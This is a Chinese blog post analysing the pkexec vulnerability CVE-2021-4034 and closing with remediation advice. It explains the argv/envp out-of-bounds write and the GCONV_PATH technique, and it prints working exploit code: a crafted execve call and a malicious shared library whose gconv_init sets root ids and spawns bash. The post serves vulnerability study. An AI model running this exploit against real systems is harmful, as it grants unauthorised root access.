# CVE-2021-4034 pkexec 再深入分析 - 白鹭鹭鹭 - 博客园

> 原文：[`www.cnblogs.com/slll/p/15937009.html`](https://www.cnblogs.com/slll/p/15937009.html)

# 1.漏洞编号

CVE-2021-4034

# 2.影响范围

2021 以前发行版

# 3.漏洞详情

此漏洞 exp 利用流程上来说，可以分为两个部分

1.设置恶意环境变量

2.通过恶意环境变量执行命令

## 3.1 设置恶意环境变量

pkexec 源码地址

> [`gitlab.freedesktop.org/polkit/polkit/-/blob/0.120/src/programs/pkexec.c`](https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.120/src/programs/pkexec.c)

在 533 行,n 被赋值为 1

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217112852-ba6f0840-8fa1-1.png)

610 行，存在越界读取，我们执行 pkexec 的时候，不传参数，argv 数组只有默认的 0 下标，1 是不存在

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217112907-c3bc5272-8fa1-1.png)

那么 argv[1]是什么呢？

当我们执行一个程序时，内核会将我们的参数、环境字符串和指针（argv 和 envp）复制到新程序堆栈的末尾；如下所示：

```
|---------+---------+-----+------------|---------+---------+-----+------------|
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|
     V         V                V           V         V                V
 "program" "-option"           NULL      "value" "PATH=name"          NULL
```

因为 argv 和 envp 指针在内存中是连续的，那么 argv[1]实际上指向的是 envp[0]

通过给 argv[1] 赋值就能修改环境变量

在 632 行，调用了`g_find_program_in_path`函数

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217112926-cf001fc4-8fa1-1.png)

根据 glib 的源码，这个函数是用来在 PATH 中搜索传参的绝对路径的，比如传参`id`,返回是`/usr/bin/id`，然后在 639 行将返回值越界写入了 argv[1],也就是第一个环境变量

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217112940-d6f2c786-8fa1-1.png)

根据这个流程，我们使用如下代码，可以做到设置恶意环境变量

shell 创建文件夹 `mkdir GCONV_PATH\=.`，在目录中创建 test 文件

```
char *a_argv[]={ NULL };
char *a_envp[]={
        "test",
        "PATH=GCONV_PATH=.",
        NULL
    };
execve("/usr/bin/pkexec", a_argv, a_envp); 
```

经过`g_find_program_in_path`函数以后,在我们创建的畸形目录中搜索到了 test 文件，此时 envp[0]的的值为`GCONV_PATH=./test`

恶意环境变量完成，然后这里就有一个问题，我们费劲巴拉搞半天，就为了把 GCONV_PATH 设置到环境变量，为什么不直接通过 execve 函数把环境变量传进入呢？

当时这里我也没理解，后来看先知上的 23R3F 师傅的文章才搞懂了，linux 的动态连接器 ld-linux-x86-64.so.2 会在特权程序执行的时候清除敏感环境变量。

我们可以测试一下，id 为没有赋予 suid 权限，成功输出了 hello。

pkexec 有 suid 权限，LD_PRELOAD 其实是没有生效的。

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217112954-df76ce52-8fa1-1.png)

我个人的理解就是，在 linux 里面定义的这些敏感环境变量，除非 suid 程序自己本身 setenv 了，否则外部是无效的

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113017-ed4a3884-8fa1-1.png)

## 3.2 通过恶意环境变量执行命令

走到 670 行，

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113031-f5962bec-8fa1-1.png)

用 for 遍历`environment_variables_to_save`作 key，去环境变量中取值

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113042-fc2af244-8fa1-1.png)

然后传给函数`validate_environment_variable`,此函数是检测 shell 是否合法的，需要通过这个函数来触发关键函数`g_printerrr`

有两种方法，传环境变量`SHELL=test`，或者走第二个 if，`XAUTHORITY=..`

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113054-0342a3b0-8fa2-1.png)

`g_printerr`中间接调用了 linux 的`iconv_open`函数，调用链如下

```
strdup_convert() <- glib/gmessages.c:1126
g_convert_with_fallback() <- glib/gmessages.c:676
g_convert() <- glib/gconvert.c:972
open_converter() <- glib/gconvert.c:876
g_iconv_open() <- glib/gconvert.c:637
try_conversion() <- glib/gconvert.c:260
iconv_open() <- glib/gconvert.c:208
```

iconv_open 函数会根据环境变量中的 GCONV_PATH 的目录下的 gconv-modules 文件

文件内容如下

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113107-0add9db4-8fa2-1.png)

表示 UTF-8 转换到 LANYI 编码，需要用到 lanyi.so，1 表示表示转换成本的数值。如果缺少该单词，则假定成本为*1*，我们将恶意的 lanyi.so 放到当前目录下，然后通过网上的一段 demo 来测试是否能正常加载 so

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iconv.h>

int main(int argc, char **argv)
{
  /* 目的编码, TRANSLIT：遇到无法转换的字符就找相近字符替换
   *          IGNORE  ：遇到无法转换字符跳过*/
  //char *encTo = "UNICODE//TRANSLIT";
  setenv("GCONV_PATH", "./", 1);
  char *encTo = "LANYI";
  /* 源编码 */
  char *encFrom = "UTF-8";

  /* 获得转换句柄
   *@param encTo 目标编码方式
   *@param encFrom 源编码方式
   *
   * */
  iconv_t cd = iconv_open (encTo, encFrom);
  if (cd == (iconv_t)-1)
  {
      perror ("iconv_open");
  }

  /* 需要转换的字符串 */
  char inbuf[1024] = "abcdef 哈哈哈哈行"; 
  size_t srclen = strlen (inbuf);
  /* 打印需要转换的字符串的长度 */
  printf("srclen=%d\n", srclen);

  /* 存放转换后的字符串 */
  size_t outlen = 1024;
  char outbuf[outlen];
  memset (outbuf, 0, outlen);

  /* 由于 iconv()函数会修改指针，所以要保存源指针 */
  char *srcstart = inbuf;
  char *tempoutbuf = outbuf;

  /* 进行转换
   *@param cd iconv_open()产生的句柄
   *@param srcstart 需要转换的字符串
   *@param srclen 存放还有多少字符没有转换
   *@param tempoutbuf 存放转换后的字符串
   *@param outlen 存放转换后,tempoutbuf 剩余的空间
   *
   * */
  size_t ret = iconv (cd, &srcstart, &srclen, &tempoutbuf, &outlen);
  if (ret == -1)
  {
      perror ("iconv");
  }
  printf ("inbuf=%s, srclen=%d, outbuf=%s, outlen=%d\n", inbuf, srclen, outbuf, outlen);
  int i = 0;
  for (i=0; i<strlen(outbuf); i++)
  {
      printf("%x\n", outbuf[i]);
  }
/* 关闭句柄 */
  iconv_close (cd);

  return 0;
} 
```

hello 被成功执行，我的 so 没有实现`gonv_init`函数，所以报错了

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113121-1383a558-8fa2-1.png)

exp:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(){
    return;
}

void gconv_init() {
    setuid(0); 
    seteuid(0); 
    setgid(0);
    setegid(0);
    static char *a_argv[] = {"bash", NULL };
    static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
    execve("/bin/bash", a_argv, a_envp);
    exit(0);
} 
```

编译`gcc -o lanyi.so -shared -fPIC lanyi.c`

然后按照前面的流程，越界写入环境变量即可，执行 so 文件

到这里还要一个问题，为什么漏洞发现者要选择`GCONV_PATH`这个相对来说比较复制的变量，而不选择`LD_PRELOAD`这个利用起来更简单的变量呢？

是因为 LD_PRELOAD 定义的 so 文件，这个加载的过程是在程序执行前执行，而 pkexec 已经启动了再设置变量是无效的。

那么就有了一个新问题，为什么 php 可以用过设置`LD_PRELOAD`来进行 bypass_functions

当时因为被这个问题搞迷糊了，就问了一下 p 牛。是因为 PHP 在设置了 LD_PRELOAD 后，又 fork 了新进程（使用 popen），此时父进程的环境变量会被新进程继承，在这个阶段 LD_PRELOAD 被利用了。所以如果 PHP 里不执行 mail 这类可以 fork 新进程的函数，也是不能利用 LD_PRELOAD 的。

看一下 php 源码，确实是 popen 启动的
![](https://xzfile.aliyuncs.com/media/upload/picture/20220217120223-692879bc-8fa6-1.png)

## 3.3 漏洞复现

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113145-21b8fd8a-8fa2-1.png)

# 4.漏洞修复

1.更新到 polkit 最新版本

2.取消 pkexec 的 suid 权限

![](https://xzfile.aliyuncs.com/media/upload/picture/20220217113201-2b8b9a66-8fa2-1.png)